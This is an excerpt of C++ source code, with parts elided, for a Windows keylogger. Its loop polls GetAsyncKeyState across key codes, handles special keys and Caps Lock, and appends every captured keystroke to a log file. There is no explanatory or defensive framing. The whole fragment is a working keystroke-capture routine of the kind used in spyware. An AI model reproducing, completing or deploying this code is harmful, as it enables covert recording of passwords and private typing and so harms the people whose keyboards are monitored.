...
void saveChanges(string information) {
    fstream logFile;
    ...
    while (true) {
        for(int i = 8 ; i <= 190 ; i++) {
            if(GetAsyncKeyState(i) == -32767) {
                isSpecialKey = std::find(std::begin(specialKeysArray), std::end(specialKeysArray), i) != std::end(specialKeysArray);
                if(isSpecialKey) {
                    specialKeyString = specialKeys(i);
                    saveChanges(specialKeyString);
                }
                else {
                    if(GetKeyState(VK_CAPITAL)) {
                        saveChanges(string(1,(char) i));
                    } else {
                        saveChanges(string(1, (char) std::tolower(i)));
                    }
                }
            }
        }
